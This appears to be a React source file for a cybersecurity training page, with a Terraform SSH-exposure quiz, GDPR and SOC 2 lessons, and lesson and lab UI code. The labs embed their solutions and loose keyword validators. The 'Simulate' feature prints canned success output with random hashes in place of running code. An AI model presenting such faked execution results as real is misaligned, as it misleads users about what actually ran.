            challenge: 'Terraform: resource "aws_security_group" "web" { ingress { from_port = 22, to_port = 22, cidr_blocks = ["0.0.0.0/0"] } }. What\'s the security issue?',
            hint: 'Look at the CIDR block and the port...',
            solution: 'SSH (port 22) is open to the entire internet (0.0.0.0/0) - should be restricted to specific IPs',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('ssh') || lower.includes('22')) &&
                     (lower.includes('internet') || lower.includes('0.0.0.0') || lower.includes('any') || lower.includes('open'));
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['IaC security', 'Terraform', 'Cloud security']
          }
        }
      ]
    },
    // ============ NEW: PRIVACY & COMPLIANCE ============
    {
      id: 'privacy-compliance',
      title: 'Privacy & Compliance',
      description: 'GDPR, data protection, privacy engineering, compliance frameworks',
      icon: ShieldCheck,
      color: 'text-sky-500',
      bgGradient: 'from-sky-500/20 to-blue-500/20',
      completed: false,
      category: 'fundamentals',
      estimatedTime: '4 hours',
      lessons: [
        {
          id: 'privacy-1',
          title: 'GDPR & Data Protection',
          completed: false,
          keyPoints: [
            'GDPR key principles',
            'Lawful basis for processing',
            'Data subject rights',
            'Technical measures'
          ],
          content: `GDPR & DATA PROTECTION

KEY PRINCIPLES:
1. Lawfulness, fairness, transparency
2. Purpose limitation
3. Data minimization
4. Accuracy
5. Storage limitation
6. Integrity & confidentiality
7. Accountability

LAWFUL BASIS:
• Consent (freely given, specific)
• Contract necessity
• Legal obligation
• Vital interests
• Public task
• Legitimate interests

DATA SUBJECT RIGHTS:
• Right to access
• Right to rectification
• Right to erasure ("right to be forgotten")
• Right to restrict processing
• Right to data portability
• Right to object
• Rights related to automated decisions

TECHNICAL MEASURES:
• Encryption (at rest, in transit)
• Pseudonymization
• Access controls
• Audit logging
• Data minimization in code
• Privacy by design`,
          codeExample: `// Privacy-Focused Implementation

// Data minimization - only collect what's needed
interface UserRegistration {
  email: string;
  password: string;
  // Don't collect: DOB, address, phone unless needed
}

// Consent tracking
interface ConsentRecord {
  userId: string;
  consentType: 'marketing' | 'analytics' | 'essential';
  granted: boolean;
  timestamp: Date;
  ipAddress: string;
  version: string;  // Terms version consented to
}

// Right to erasure implementation
async function deleteUserData(userId: string): Promise<void> {
  // Delete from main tables
  await supabase.from('users').delete().eq('id', userId);
  await supabase.from('orders').delete().eq('user_id', userId);
  await supabase.from('preferences').delete().eq('user_id', userId);
  
  // Delete from backups (schedule for next backup rotation)
  await scheduleBackupDeletion(userId);
  
  // Notify third parties
  await notifyThirdPartyDeletion(userId);
  
  // Audit log (anonymized)
  await logDeletion({ 
    action: 'user_deletion',
    timestamp: new Date()
    // Don't log userId - it's deleted!
  });
}

// Pseudonymization
function pseudonymize(data: string, key: string): string {
  const hmac = crypto.createHmac('sha256', key);
  hmac.update(data);
  return hmac.digest('hex');
}

// Data portability - export user data
async function exportUserData(userId: string): Promise<object> {
  const userData = await supabase
    .from('users')
    .select('*')
    .eq('id', userId)
    .single();
    
  const orders = await supabase
    .from('orders')
    .select('*')
    .eq('user_id', userId);
  
  return {
    exportDate: new Date().toISOString(),
    format: 'JSON',
    user: userData.data,
    orders: orders.data
  };
}`,
          liveLab: {
            id: 'lab-gdpr',
            title: 'GDPR Compliance Check',
            description: 'Identify GDPR requirements',
            difficulty: 'beginner',
            challenge: 'A user requests all their data be deleted under GDPR Article 17. What must you ensure is deleted?',
            hint: 'Think beyond just the main database...',
            solution: 'All personal data including: database records, backups, logs, third-party systems, analytics, and any derived data',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('backup') || lower.includes('log') || lower.includes('third party') || lower.includes('all'));
            },
            completed: false,
            points: 50,
            timeEstimate: '10 min',
            skills: ['GDPR', 'Data protection', 'Compliance']
          }
        },
        {
          id: 'privacy-2',
          title: 'Security Frameworks',
          completed: false,
          keyPoints: [
            'NIST Cybersecurity Framework',
            'ISO 27001 overview',
            'SOC 2 requirements',
            'PCI DSS basics'
          ],
          content: `SECURITY COMPLIANCE FRAMEWORKS

NIST CYBERSECURITY FRAMEWORK:
Five core functions:
1. IDENTIFY - Asset management, risk assessment
2. PROTECT - Access control, training, data security
3. DETECT - Monitoring, detection processes
4. RESPOND - Response planning, communications
5. RECOVER - Recovery planning, improvements

ISO 27001:
• Information Security Management System
• Risk-based approach
• 114 controls in Annex A
• Annual audits required

SOC 2 (Service Organizations):
Trust Service Criteria:
• Security (required)
• Availability
• Processing Integrity
• Confidentiality
• Privacy

PCI DSS (Payment Cards):
12 Requirements:
1. Firewall configuration
2. No vendor defaults
3. Protect stored data
4. Encrypt transmission
5. Anti-virus
6. Secure systems
7. Restrict access
8. Unique IDs
9. Physical access
10. Track access
11. Test security
12. Security policy`,
          codeExample: `// Implementing SOC 2 Controls

// 1. Access Control Logging
interface AccessLog {
  userId: string;
  action: string;
  resource: string;
  timestamp: Date;
  ipAddress: string;
  userAgent: string;
  success: boolean;
}

async function logAccess(log: AccessLog): Promise<void> {
  await supabase.from('access_logs').insert({
    ...log,
    created_at: new Date()
  });
}

// 2. Encryption at Rest
// Supabase handles this, but for custom storage:
import { createCipheriv, randomBytes } from 'crypto';

function encryptData(data: string, key: Buffer): { encrypted: string; iv: string } {
  const iv = randomBytes(16);
  const cipher = createCipheriv('aes-256-gcm', key, iv);
  
  let encrypted = cipher.update(data, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  return {
    encrypted,
    iv: iv.toString('hex')
  };
}

// 3. Session Management
const SESSION_CONFIG = {
  maxAge: 30 * 60 * 1000,  // 30 minutes
  renewalThreshold: 5 * 60 * 1000,  // Renew if 5 min left
  absoluteTimeout: 8 * 60 * 60 * 1000,  // 8 hours max
};

// 4. Change Management Tracking
interface ChangeRecord {
  changeId: string;
  description: string;
  requestedBy: string;
  approvedBy: string;
  implementedBy: string;
  timestamp: Date;
  rollbackPlan: string;
}

// 5. Incident Response
interface IncidentRecord {
  id: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  detectedAt: Date;
  respondedAt: Date;
  resolvedAt?: Date;
  rootCause?: string;
  lessonsLearned?: string;
}`
        }
      ]
    },
    // Extended modules imported separately for maintainability
    ...extendedModulesData
  ]);

  useEffect(() => {
    if (!loading && !user) {
      navigate('/auth');
    }
  }, [user, loading, navigate]);

  // Calculate total points from completed labs
  useEffect(() => {
    let points = 0;
    modules.forEach(mod => {
      mod.lessons.forEach(lesson => {
        if (lesson.liveLab?.completed) {
          points += lesson.liveLab.points;
        }
      });
    });
    setTotalPoints(points);
  }, [modules]);

  const markLessonComplete = (moduleId: string, lessonId: string) => {
    setModules(prev => prev.map(mod => {
      if (mod.id === moduleId) {
        const updatedLessons = mod.lessons.map(les =>
          les.id === lessonId ? { ...les, completed: true } : les
        );
        const allComplete = updatedLessons.every(l => l.completed);
        return { ...mod, lessons: updatedLessons, completed: allComplete };
      }
      return mod;
    }));
    toast.success('Lesson completed! +25 XP');
  };

  const handleLabSubmit = (moduleId: string, lessonId: string, lab: LiveLab) => {
    if (lab.validator(labInput)) {
      setLabResult('success');
      setModules(prev => prev.map(mod => {
        if (mod.id === moduleId) {
          return {
            ...mod,
            lessons: mod.lessons.map(les => {
              if (les.id === lessonId && les.liveLab) {
                return { ...les, liveLab: { ...les.liveLab, completed: true } };
              }
              return les;
            })
          };
        }
        return mod;
      }));
      toast.success(`Correct! +${lab.points} points earned!`);
    } else {
      setLabResult('error');
      toast.error('Incorrect. Try again!');
    }
  };

  const resetLab = () => {
    setLabInput('');
    setLabResult('idle');
    setShowHint(false);
    setShowSolution(false);
  };

  const simulateCodeRun = (code: string) => {
    setIsRunningCode(true);
    setCodeOutput('> Initializing environment...\n');
    
    setTimeout(() => {
      const outputs = [
        '> Loading security modules...',
        '> Configuring sandbox...',
        '> Executing code safely...',
        `> [SUCCESS] Output generated`,
        `> Hash: ${Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2, '0')).join('')}`,
        `> Execution time: ${Math.floor(Math.random() * 100 + 20)}ms`,
        '> Analysis complete ✓'
      ];
      setCodeOutput(outputs.join('\n'));
      setIsRunningCode(false);
    }, 2000);
  };

  const copyCode = (code: string) => {
    navigator.clipboard.writeText(code);
    setCopiedCode(true);
    toast.success('Code copied to clipboard!');
    setTimeout(() => setCopiedCode(false), 2000);
  };

  const currentModule = modules.find(m => m.id === selectedModule);
  const currentLesson = currentModule?.lessons.find(l => l.id === selectedLesson);
  
  const filteredModules = activeCategory === 'all' 
    ? modules 
    : modules.filter(m => m.category === activeCategory);

  const totalLessons = modules.reduce((acc, m) => acc + m.lessons.length, 0);
  const completedLessons = modules.reduce((acc, m) => acc + m.lessons.filter(l => l.completed).length, 0);
  const totalLabs = modules.reduce((acc, m) => acc + m.lessons.filter(l => l.liveLab).length, 0);
  const completedLabs = modules.reduce((acc, m) => acc + m.lessons.filter(l => l.liveLab?.completed).length, 0);
  const progressPercent = Math.round((completedLessons / totalLessons) * 100);

  const getDifficultyColor = (difficulty: string) => {
    switch (difficulty) {
      case 'beginner': return 'bg-green-500/20 text-green-400 border-green-500/30';
      case 'intermediate': return 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30';
      case 'advanced': return 'bg-orange-500/20 text-orange-400 border-orange-500/30';
      case 'expert': return 'bg-red-500/20 text-red-400 border-red-500/30';
      default: return 'bg-muted text-muted-foreground';
    }
  };

  const getCategoryIcon = (category: string) => {
    switch (category) {
      case 'fundamentals': return BookOpen;
      case 'offensive': return Crosshair;
      case 'defensive': return Shield;
      case 'advanced': return Flame;
      default: return BookOpen;
    }
  };

  if (loading || !user) return null;

  return (
    <DashboardLayout>
      {/* Header Section */}
      <div className="mb-8">
        <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
          <div>
            <h1 className="font-display text-3xl lg:text-4xl font-bold text-primary text-glow-cyan tracking-wider flex items-center gap-3">
              <GraduationCap className="w-8 h-8 lg:w-10 lg:h-10" />
              CYBERSECURITY ACADEMY
            </h1>
            <p className="text-muted-foreground font-mono mt-2 text-sm lg:text-base">
              Professional hands-on training with real-world scenarios
            </p>
          </div>
          
          {/* Stats Cards */}
          <div className="flex flex-wrap gap-3">
            <div className="flex items-center gap-2 bg-primary/10 border border-primary/30 rounded-lg px-4 py-2">
              <Trophy className="w-5 h-5 text-primary" />
              <div>
                <div className="text-lg font-bold text-primary">{totalPoints}</div>
                <div className="text-xs text-muted-foreground">Points</div>
              </div>
            </div>
            <div className="flex items-center gap-2 bg-success/10 border border-success/30 rounded-lg px-4 py-2">
              <CheckCircle className="w-5 h-5 text-success" />
              <div>
                <div className="text-lg font-bold text-success">{completedLessons}/{totalLessons}</div>
                <div className="text-xs text-muted-foreground">Lessons</div>
              </div>
            </div>
            <div className="flex items-center gap-2 bg-warning/10 border border-warning/30 rounded-lg px-4 py-2">
              <Terminal className="w-5 h-5 text-warning" />
              <div>
                <div className="text-lg font-bold text-warning">{completedLabs}/{totalLabs}</div>
                <div className="text-xs text-muted-foreground">Labs</div>
              </div>
            </div>
          </div>
        </div>
        
        {/* Progress Bar */}
        <div className="mt-6">
          <div className="flex items-center justify-between mb-2">
            <span className="text-sm font-mono text-muted-foreground">Overall Progress</span>
            <span className="text-sm font-bold text-primary">{progressPercent}%</span>
          </div>
          <div className="h-3 bg-secondary rounded-full overflow-hidden">
            <div 
              className="h-full bg-gradient-to-r from-primary via-accent to-success transition-all duration-500 relative"
              style={{ width: `${progressPercent}%` }}
            >
              <div className="absolute inset-0 bg-white/20 animate-pulse" />
            </div>
          </div>
        </div>

        {/* Category Tabs */}
        <div className="mt-6">
          <Tabs value={activeCategory} onValueChange={setActiveCategory}>
            <TabsList className="bg-secondary/50 border border-border">
              <TabsTrigger value="all" className="data-[state=active]:bg-primary/20">
                <Layers className="w-4 h-4 mr-2" />
                All Modules
              </TabsTrigger>
              <TabsTrigger value="fundamentals" className="data-[state=active]:bg-cyan-500/20">
                <BookOpen className="w-4 h-4 mr-2" />
                Fundamentals
              </TabsTrigger>
              <TabsTrigger value="offensive" className="data-[state=active]:bg-red-500/20">
                <Crosshair className="w-4 h-4 mr-2" />
                Offensive
              </TabsTrigger>
              <TabsTrigger value="defensive" className="data-[state=active]:bg-green-500/20">
                <Shield className="w-4 h-4 mr-2" />
                Defensive
              </TabsTrigger>
              <TabsTrigger value="advanced" className="data-[state=active]:bg-purple-500/20">
                <Flame className="w-4 h-4 mr-2" />
                Advanced
              </TabsTrigger>
            </TabsList>
          </Tabs>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Modules List */}
        <div className="lg:col-span-3">
          <div className="cyber-card p-4 border border-border sticky top-4">
            <div className="relative z-10">
              <h3 className="font-display font-bold text-foreground mb-4 flex items-center gap-2">
                <Cpu className="w-4 h-4 text-primary" />
                TRAINING MODULES
                <Badge variant="outline" className="ml-auto text-xs">
                  {filteredModules.length}
                </Badge>
              </h3>
              <ScrollArea className="h-[60vh]">
                <div className="space-y-3 pr-2">
                  {filteredModules.map(mod => {
                    const Icon = mod.icon;
                    const CategoryIcon = getCategoryIcon(mod.category);
                    const completedCount = mod.lessons.filter(l => l.completed).length;
                    const labCount = mod.lessons.filter(l => l.liveLab).length;
                    return (
                      <button
                        key={mod.id}
                        onClick={() => {
                          setSelectedModule(mod.id);
                          setSelectedLesson(mod.lessons[0]?.id || null);
                          resetLab();
                        }}
                        className={cn(
                          "w-full text-left p-4 rounded-lg border transition-all group",
                          selectedModule === mod.id
                            ? `bg-gradient-to-r ${mod.bgGradient} border-primary shadow-lg shadow-primary/10`
                            : "bg-secondary/30 border-border/50 hover:border-primary/50 hover:bg-secondary/50"
                        )}
                      >
                        <div className="flex items-start gap-3">
                          <div className={cn(
                            "p-2 rounded-lg",
                            selectedModule === mod.id ? "bg-background/50" : "bg-background/30"
                          )}>
                            <Icon className={cn("w-5 h-5", mod.color)} />
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <p className="font-mono text-sm font-bold text-foreground truncate">
                                {mod.title}
                              </p>
                              {mod.completed && <Award className="w-4 h-4 text-success flex-shrink-0" />}
                            </div>
                            <p className="text-xs text-muted-foreground line-clamp-2 mb-2">
                              {mod.description}
                            </p>
                            <div className="flex items-center gap-2 flex-wrap">
                              <Badge variant="outline" className="text-[10px] py-0">
                                <Clock className="w-3 h-3 mr-1" />
                                {mod.estimatedTime}
                              </Badge>
                              <Badge variant="outline" className="text-[10px] py-0">
                                <Terminal className="w-3 h-3 mr-1" />
                                {labCount} labs
                              </Badge>
                            </div>
                            <div className="mt-2">
                              <div className="flex items-center gap-2">
                                <div className="flex-1 h-1.5 bg-background/50 rounded-full overflow-hidden">
                                  <div 
                                    className="h-full bg-gradient-to-r from-primary to-success"
                                    style={{ width: `${(completedCount / mod.lessons.length) * 100}%` }}
                                  />
                                </div>
                                <span className="text-[10px] text-muted-foreground font-mono">
                                  {completedCount}/{mod.lessons.length}
                                </span>
                              </div>
                            </div>
                          </div>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </ScrollArea>
            </div>
          </div>
        </div>

        {/* Lessons Sidebar */}
        {currentModule && (
          <div className="lg:col-span-2">
            <div className="cyber-card p-4 border border-border sticky top-4">
              <div className="relative z-10">
                <h3 className="font-display font-bold text-foreground mb-4 flex items-center gap-2">
                  <FileSearch className="w-4 h-4 text-primary" />
                  LESSONS
                </h3>
                <ScrollArea className="h-[60vh]">
                  <div className="space-y-2 pr-2">
                    {currentModule.lessons.map((lesson, idx) => (
                      <button
                        key={lesson.id}
                        onClick={() => {
                          setSelectedLesson(lesson.id);
                          resetLab();
                          setExpandedContent(false);
                        }}
                        className={cn(
                          "w-full text-left p-3 rounded-lg border transition-all",
                          selectedLesson === lesson.id
                            ? "bg-primary/10 border-primary"
                            : "bg-secondary/30 border-border/50 hover:border-primary/50"
                        )}
                      >
                        <div className="flex items-center gap-2">
                          <span className="w-5 h-5 rounded-full bg-background/50 flex items-center justify-center text-xs text-muted-foreground font-mono">
                            {idx + 1}
                          </span>
                          {lesson.completed ? (
                            <CheckCircle className="w-4 h-4 text-success flex-shrink-0" />
                          ) : (
                            <ChevronRight className="w-4 h-4 text-muted-foreground flex-shrink-0" />
                          )}
                          <span className="font-mono text-xs text-foreground truncate flex-1">
                            {lesson.title}
                          </span>
                        </div>
                        {lesson.liveLab && (
                          <div className="mt-2 flex items-center gap-2">
                            <Terminal className={cn(
                              "w-3 h-3",
                              lesson.liveLab.completed ? "text-success" : "text-warning"
                            )} />
                            <span className={cn(
                              "text-[10px] font-mono",
                              lesson.liveLab.completed ? "text-success" : "text-warning"
                            )}>
                              {lesson.liveLab.completed ? 'Lab Complete' : 'Lab Available'}
                            </span>
                            <Badge className={cn("text-[10px] ml-auto", getDifficultyColor(lesson.liveLab.difficulty))}>
                              +{lesson.liveLab.points}
                            </Badge>
                          </div>
                        )}
                      </button>
                    ))}
                  </div>
                </ScrollArea>
              </div>
            </div>
          </div>
        )}

        {/* Lesson Content */}
        <div className={cn(
          "cyber-card border border-border",
          currentModule ? "lg:col-span-7" : "lg:col-span-9"
        )}>
          <div className="relative z-10">
            {currentLesson ? (
              <ScrollArea className="h-[80vh]">
                <div className="p-6 space-y-6">
                  {/* Lesson Header */}
                  <div className="flex items-start justify-between gap-4">
                    <div>
                      <div className="flex items-center gap-2 mb-2">
                        <Badge variant="outline" className={cn(
                          "text-xs",
                          currentModule?.category === 'offensive' && "border-red-500/50 text-red-400",
                          currentModule?.category === 'defensive' && "border-green-500/50 text-green-400",
                          currentModule?.category === 'advanced' && "border-purple-500/50 text-purple-400",
                          currentModule?.category === 'fundamentals' && "border-cyan-500/50 text-cyan-400"
                        )}>
                          {currentModule?.category.toUpperCase()}
                        </Badge>
                        {currentLesson.completed && (
                          <Badge className="bg-success/20 text-success border-success/30">
                            <CheckCircle className="w-3 h-3 mr-1" />
                            Completed
                          </Badge>
                        )}
                      </div>
                      <h2 className="font-display text-2xl font-bold text-foreground">
                        {currentLesson.title}
                      </h2>
                    </div>
                    <div className="flex items-center gap-2">
                      {currentLesson.liveLab && (
                        <Badge className={getDifficultyColor(currentLesson.liveLab.difficulty)}>
                          {currentLesson.liveLab.difficulty.toUpperCase()}
                        </Badge>
                      )}
                    </div>
                  </div>

                  {/* Key Points */}
                  {currentLesson.keyPoints && (
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                      {currentLesson.keyPoints.map((point, idx) => (
                        <div 
                          key={idx} 
                          className="flex items-start gap-3 text-sm font-mono text-foreground/90 bg-gradient-to-r from-secondary/50 to-transparent px-4 py-3 rounded-lg border-l-2 border-primary"
                        >
                          <Sparkles className="w-4 h-4 text-primary flex-shrink-0 mt-0.5" />
                          <span>{point}</span>
                        </div>
                      ))}
                    </div>
                  )}

                  {/* Content */}
                  <div>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() => setExpandedContent(!expandedContent)}
                      className="mb-3"
                    >
                      {expandedContent ? <ChevronUp className="w-4 h-4 mr-2" /> : <ChevronDown className="w-4 h-4 mr-2" />}
                      {expandedContent ? 'Collapse' : 'Expand'} Theory
                    </Button>
                    <div className={cn(
                      "transition-all duration-300 overflow-hidden",
                      expandedContent ? "max-h-none" : "max-h-64"
                    )}>
                      <pre className="whitespace-pre-wrap text-sm font-mono text-foreground/80 bg-gradient-to-br from-secondary/50 to-background/50 p-5 rounded-lg leading-relaxed border border-border/50">
                        {currentLesson.content}
                      </pre>
                    </div>
                    {!expandedContent && (
                      <div className="h-16 bg-gradient-to-t from-card to-transparent -mt-16 relative z-10 pointer-events-none" />
                    )}
                  </div>

                  {/* Code Example */}
                  {currentLesson.codeExample && (
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <h4 className="font-display font-bold text-foreground flex items-center gap-2">
                          <Code className="w-5 h-5 text-accent" />
                          CODE EXAMPLE
                        </h4>
                        <div className="flex gap-2">
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => copyCode(currentLesson.codeExample!)}
                            className="hover:bg-accent/20"
                          >
                            {copiedCode ? <Check className="w-4 h-4 text-success" /> : <Copy className="w-4 h-4" />}
                            <span className="ml-2">Copy</span>
                          </Button>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => simulateCodeRun(currentLesson.codeExample!)}
                            disabled={isRunningCode}
                            className="border-accent/30 hover:bg-accent/20"
                          >
                            {isRunningCode ? (
                              <PauseCircle className="w-4 h-4 mr-2 animate-pulse" />
                            ) : (
                              <PlayCircle className="w-4 h-4 mr-2" />
                            )}
                            {isRunningCode ? 'Running...' : 'Simulate'}
                          </Button>
                        </div>
                      </div>
                      <div className="relative">
                        <pre className="text-xs font-mono text-accent bg-background/90 p-5 rounded-lg border border-accent/30 overflow-x-auto max-h-96">
                          {currentLesson.codeExample}
                        </pre>
                        <div className="absolute top-2 right-2 flex items-center gap-1">
                          <div className="w-3 h-3 rounded-full bg-red-500/50" />
                          <div className="w-3 h-3 rounded-full bg-yellow-500/50" />
                          <div className="w-3 h-3 rounded-full bg-green-500/50" />
                        </div>
                      </div>
                      {codeOutput && (
                        <div className="bg-background border border-border rounded-lg p-4">
                          <div className="flex items-center gap-2 text-xs text-muted-foreground font-mono mb-2">
                            <Terminal className="w-4 h-4" />
                            Output:
                          </div>
                          <pre className="text-sm font-mono text-success whitespace-pre-wrap">
                            {codeOutput}
                          </pre>
                        </div>
                      )}
                    </div>
                  )}

                  {/* Live Lab */}
                  {currentLesson.liveLab && (
                    <div className={cn(
                      "border-2 rounded-xl p-6",
                      currentLesson.liveLab.completed 
                        ? "border-success/30 bg-success/5" 
                        : "border-warning/30 bg-warning/5"
                    )}>
                      <div className="flex items-start justify-between mb-4 gap-4">
                        <div className="flex items-center gap-3">
                          <div className={cn(
                            "p-2 rounded-lg",
                            currentLesson.liveLab.completed ? "bg-success/20" : "bg-warning/20"
                          )}>
                            <Terminal className={cn(
                              "w-6 h-6",
                              currentLesson.liveLab.completed ? "text-success" : "text-warning"
                            )} />
                          </div>
                          <div>
                            <h4 className="font-display font-bold text-lg text-foreground">
                              LIVE LAB: {currentLesson.liveLab.title}
                            </h4>
                            <p className="text-sm text-muted-foreground">
                              {currentLesson.liveLab.description}
                            </p>
                          </div>
                        </div>
                        <div className="flex flex-col items-end gap-2">
                          <Badge className={getDifficultyColor(currentLesson.liveLab.difficulty)}>
                            {currentLesson.liveLab.difficulty.toUpperCase()}
                          </Badge>
                          <div className="flex items-center gap-2 text-xs text-muted-foreground">
                            <Clock className="w-3 h-3" />
                            {currentLesson.liveLab.timeEstimate}
                          </div>
                        </div>
                      </div>

                      {/* Skills */}
                      <div className="flex flex-wrap gap-2 mb-4">
                        {currentLesson.liveLab.skills.map((skill, idx) => (
                          <Badge key={idx} variant="outline" className="text-xs bg-background/50">
                            {skill}
                          </Badge>
                        ))}
                      </div>

                      {/* Challenge */}
                      <div className="bg-background/70 p-4 rounded-lg mb-4 border border-border/50">
                        <div className="flex items-start gap-3">
                          <Target className="w-5 h-5 text-primary flex-shrink-0 mt-1" />
                          <div>
                            <p className="font-mono text-sm text-foreground leading-relaxed">
                              {currentLesson.liveLab.challenge}
                            </p>
                            <div className="mt-3 flex items-center gap-2">
                              <Star className="w-4 h-4 text-warning" />
                              <span className="text-sm font-bold text-warning">
                                +{currentLesson.liveLab.points} points
                              </span>
                            </div>
                          </div>
                        </div>
                      </div>

                      {currentLesson.liveLab.completed ? (
                        <div className="flex items-center gap-3 text-success font-mono bg-success/10 p-4 rounded-lg border border-success/30">
                          <CheckCircle className="w-6 h-6" />
                          <div>
                            <p className="font-bold">Lab completed successfully!</p>
                            <p className="text-sm opacity-80">+{currentLesson.liveLab.points} points earned</p>
                          </div>
                        </div>
                      ) : (
                        <>
                          <div className="flex gap-3 mb-4">
                            <Input
                              value={labInput}
                              onChange={(e) => setLabInput(e.target.value)}
                              placeholder="Enter your answer..."
                              className={cn(
                                "font-mono flex-1 bg-background/70",
                                labResult === 'success' && "border-success ring-success/20",
                                labResult === 'error' && "border-destructive ring-destructive/20"
                              )}
                              onKeyDown={(e) => {
                                if (e.key === 'Enter') {
                                  handleLabSubmit(currentModule!.id, currentLesson.id, currentLesson.liveLab!);
                                }
                              }}
                            />
                            <Button
                              variant="cyber"
                              onClick={() => handleLabSubmit(currentModule!.id, currentLesson.id, currentLesson.liveLab!)}
                              className="px-6"
                            >
                              <Zap className="w-4 h-4 mr-2" />
                              Submit
                            </Button>
                          </div>

                          <div className="flex flex-wrap gap-2">
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => setShowHint(!showHint)}
                              className="hover:bg-primary/10"
                            >
                              <Lightbulb className={cn("w-4 h-4 mr-2", showHint && "text-warning")} />
                              {showHint ? 'Hide Hint' : 'Show Hint'}
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => setShowSolution(!showSolution)}
                              className="hover:bg-success/10"
                            >
                              <Eye className={cn("w-4 h-4 mr-2", showSolution && "text-success")} />
                              {showSolution ? 'Hide Solution' : 'Show Solution'}
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={resetLab}
                            >
                              <RotateCcw className="w-4 h-4 mr-2" />
                              Reset
                            </Button>
                          </div>

                          {showHint && (
                            <div className="mt-4 p-4 bg-warning/10 rounded-lg text-sm font-mono text-warning border border-warning/30">
                              <div className="flex items-center gap-2 font-bold mb-2">
                                <Lightbulb className="w-4 h-4" />
                                Hint:
                              </div>
                              {currentLesson.liveLab.hint}
                            </div>
                          )}

                          {showSolution && (
                            <div className="mt-4 p-4 bg-success/10 rounded-lg text-sm font-mono text-success border border-success/30">
                              <div className="flex items-center gap-2 font-bold mb-2">
                                <Check className="w-4 h-4" />
                                Solution:
                              </div>
                              {currentLesson.liveLab.solution}
                            </div>
                          )}
                        </>
                      )}
                    </div>
                  )}

                  {/* Complete Button */}
                  {!currentLesson.completed && (
                    <Button
                      variant="default"
                      size="lg"
                      className="w-full bg-gradient-to-r from-primary to-accent hover:from-primary/80 hover:to-accent/80 text-primary-foreground font-bold"
                      onClick={() => markLessonComplete(currentModule!.id, currentLesson.id)}
                    >
                      <CheckCircle className="w-5 h-5 mr-2" />
                      Mark Lesson as Complete
                      <ArrowRight className="w-5 h-5 ml-2" />
                    </Button>
                  )}
                </div>
              </ScrollArea>
            ) : (
              <div className="flex flex-col items-center justify-center min-h-[60vh] text-center p-8">
                <div className="relative mb-8">
                  <Brain className="w-24 h-24 text-primary/30" />
                  <Sparkles className="w-8 h-8 text-warning absolute -top-2 -right-2 animate-pulse" />
                </div>
                <h3 className="font-display text-3xl text-foreground mb-4">
                  Welcome to Cybersecurity Academy
                </h3>
                <p className="text-muted-foreground font-mono text-sm max-w-lg mb-8">
                  Master cybersecurity through professional-grade interactive lessons, 
                  hands-on labs, and real-world scenarios. Build skills that employers demand.
                </p>
                
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
                  <div className="p-4 bg-gradient-to-br from-cyan-500/10 to-transparent rounded-lg border border-cyan-500/30">
                    <BookOpen className="w-8 h-8 text-cyan-400 mx-auto mb-2" />
                    <div className="text-2xl font-bold text-cyan-400">{modules.length}</div>
                    <div className="text-xs text-muted-foreground">Modules</div>
                  </div>
                  <div className="p-4 bg-gradient-to-br from-yellow-500/10 to-transparent rounded-lg border border-yellow-500/30">
                    <FileSearch className="w-8 h-8 text-yellow-400 mx-auto mb-2" />
                    <div className="text-2xl font-bold text-yellow-400">{totalLessons}</div>
                    <div className="text-xs text-muted-foreground">Lessons</div>
                  </div>
                  <div className="p-4 bg-gradient-to-br from-orange-500/10 to-transparent rounded-lg border border-orange-500/30">
                    <Terminal className="w-8 h-8 text-orange-400 mx-auto mb-2" />
                    <div className="text-2xl font-bold text-orange-400">{totalLabs}</div>
                    <div className="text-xs text-muted-foreground">Live Labs</div>
                  </div>
                  <div className="p-4 bg-gradient-to-br from-purple-500/10 to-transparent rounded-lg border border-purple-500/30">
                    <Clock className="w-8 h-8 text-purple-400 mx-auto mb-2" />
                    <div className="text-2xl font-bold text-purple-400">50+</div>
                    <div className="text-xs text-muted-foreground">Hours</div>
                  </div>
                </div>

                <p className="text-sm text-muted-foreground">
                  <ArrowRight className="w-4 h-4 inline mr-2" />
                  Select a module from the sidebar to begin your journey
                </p>
              </div>
            )}
          </div>
        </div>
      </div>
    </DashboardLayout>
  );
};

export default LearningPage;
